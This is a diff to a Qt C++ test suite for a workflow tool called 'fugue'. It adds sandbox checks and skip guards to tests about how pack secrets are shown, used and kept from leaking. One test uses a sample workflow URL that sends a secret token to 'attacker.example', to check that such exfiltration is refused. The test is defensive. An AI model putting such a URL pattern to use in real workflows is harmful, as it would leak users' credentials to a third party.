@@ -18,6 +18,8 @@
 #include <QTimer>
 #include <QtTest>
 
+#include "engine/sandbox.h"
+
 #include "../test_paths.h"
 #include "../engine/fake_http.h"
 
@@ -138,7 +140,7 @@ private slots:
         QVERIFY2(QFileInfo(m_dir.filePath("fugue-home/data/fugue/packs/" + kPackId + "/pack.json")).isFile(), shown.constData());
         // The trust prompt lists the secrets the pack reads, by name.
         QVERIFY2(shown.contains("token_1") && shown.contains("token_3"), shown.constData());
-        QVERIFY2(shown.contains("advisory"), shown.constData()); // isolation between packs is said to be advisory
+        QVERIFY2(shown.contains("sandbox"), shown.constData()); // the programs run in the sandbox, which cannot read the config folder
     }
 
     void secretsAreListedByNameAsNotSetFirst() {
@@ -151,6 +153,8 @@ private slots:
     }
 
     void aRunBeforeTheSecretIsSetFailsNamingItAndNothingIsSent() {
+        if (!fugue::sandbox::available())
+            QSKIP("a pack's program runs in the sandbox, and bubblewrap or user namespaces are not available here");
         const QString file = workflow({{"method", "POST"}, {"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Api-Key: {secret:token_1}"}}, "call.fugue");
         const int before = m_server.requestsTo("POST", "/hook").size();
         const Outcome ran = fugue({"run", file, "--wait", "--json"});
@@ -189,6 +193,8 @@ private slots:
     }
 
     void aRunUsesTheKeyAndLeavesNoCopyInRunRecordsEventsLogsOrTheCache() {
+        if (!fugue::sandbox::available())
+            QSKIP("a pack's program runs in the sandbox, and bubblewrap or user namespaces are not available here");
         const QString file = workflow({{"method", "POST"}, {"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Api-Key: {secret:token_1}"}, {"path1", "key"}},
                                       "keyed.fugue");
         const Outcome ran = fugue({"run", file, "--wait", "--json"});
@@ -204,6 +210,8 @@ private slots:
 
     // A shared workflow that names another address for the key is refused when it runs, and nothing is sent.
     void aWorkflowThatSendsTheKeyToAnotherAddressIsRefusedAndNothingLeaves() {
+        if (!fugue::sandbox::available())
+            QSKIP("a pack's program runs in the sandbox, and bubblewrap or user namespaces are not available here");
         const int before = m_server.requests().size();
         for (const QString &url : {QStringLiteral("https://attacker.example/c?k={secret:token_1}"), QString(m_server.origin()).replace("127.0.0.1", "127.0.0.2") + "/hook"}) {
             const QString file = workflow({{"method", "POST"}, {"url", url}, {"headers", "X-Api-Key: {secret:token_1}"}}, "attack.fugue");
